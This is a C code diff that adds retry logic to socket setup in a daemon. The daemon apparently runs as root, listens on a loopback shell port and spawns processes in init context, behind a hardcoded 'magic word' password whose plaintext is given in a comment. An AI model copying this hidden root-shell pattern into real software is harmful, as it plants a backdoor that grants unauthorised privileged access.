@@ -37,6 +37,8 @@
 #define ATTY_OUT    2
 #define ATTY_ERR    4
 
+#define CREATE_SOCK_ATTEMPTS 10
+
 // "0c7e88b2c6bb81acf089d8f5b73489d1ecedc6b9" : sha1 of "l337Wh0R3@d"
 #define MAGIC_WORD "\xf0\xc8\x10\x40\x93\x47\x95\x58\x58\x92\x42\x93\x46\x92\x92\x58\x41\x91\x93\x96\x40\x58\x59\x94\x58\x96\x45\x92\x47\x43\x44\x58\x59\x94\x41\x95\x93\x95\x94\x93\x46\x92\x59"
 
@@ -251,47 +253,62 @@ static int daemon_accept(int fd) {
 
 // Run the daemon process
 int run_daemon() {
-  int fd, optval;
+  int fd, optval, attempt = 0;
   struct sockaddr_in sun;
-  
+  int socket_done = 0;
+
   setgid(0);
   setegid(0);
-
-  fd = socket(AF_INET, SOCK_STREAM, 0);
-  if (fd < 0) {
-    PLOGE("socket");
-    return -1;
-  }
-  if (fcntl(fd, F_SETFD, FD_CLOEXEC)) {
-    PLOGE("fcntl FD_CLOEXEC");
-    goto err;
-  }
-
-  // Open a socket on localhost
-  memset(&sun, 0, sizeof(sun));
-  sun.sin_family = AF_INET;
-  sun.sin_port = htons(SHELL_PORT);
-  sun.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
   
-  // Reuse socket
-  optval = 1;
-  if(setsockopt(fd, SOL_SOCKET, (SO_REUSEADDR |  SO_REUSEADDR), &optval, sizeof optval) < 0) {
-    PLOGE("daemon setsockopt");
-    goto err;
+  while(attempt < CREATE_SOCK_ATTEMPTS) {
+    fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd < 0) {
+      PLOGE("socket");
+      goto sleep;
+    }
+
+    if (fcntl(fd, F_SETFD, FD_CLOEXEC)) {
+      PLOGE("fcntl FD_CLOEXEC");
+      goto sleep;
+    }
+
+    // Open a socket on localhost
+    memset(&sun, 0, sizeof(sun));
+    sun.sin_family = AF_INET;
+    sun.sin_port = htons(SHELL_PORT);
+    sun.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+  
+    // Reuse socket
+    optval = 1;
+    if(setsockopt(fd, SOL_SOCKET, (SO_REUSEADDR |  SO_REUSEADDR), &optval, sizeof optval) < 0) {
+      PLOGE("daemon setsockopt");
+      goto sleep;
+    }
+
+    // bind a socket to a device name (might not work on all systems):
+
+    if (bind(fd, (struct sockaddr*)&sun, sizeof(sun)) < 0) {
+      PLOGE("daemon bind");
+      goto sleep;
+    }
+  
+    if (listen(fd, 10) < 0) {
+      PLOGE("daemon listen");
+      goto sleep;
+    }
+    else {
+      socket_done = 1;
+      break;
+    }
+
+  sleep:
+    sleep(5);
+    attempt += 1;
   }
 
-  // bind a socket to a device name (might not work on all systems):
+  if(!socket_done)
+    goto err;
 
-  if (bind(fd, (struct sockaddr*)&sun, sizeof(sun)) < 0) {
-    PLOGE("daemon bind");
-    goto err;
-  }
-  
-  if (listen(fd, 10) < 0) {
-    PLOGE("daemon listen");
-    goto err;
-  }
-  
   // Accept loop
   // For each incoming connection spawn a new process with init context
   int client;
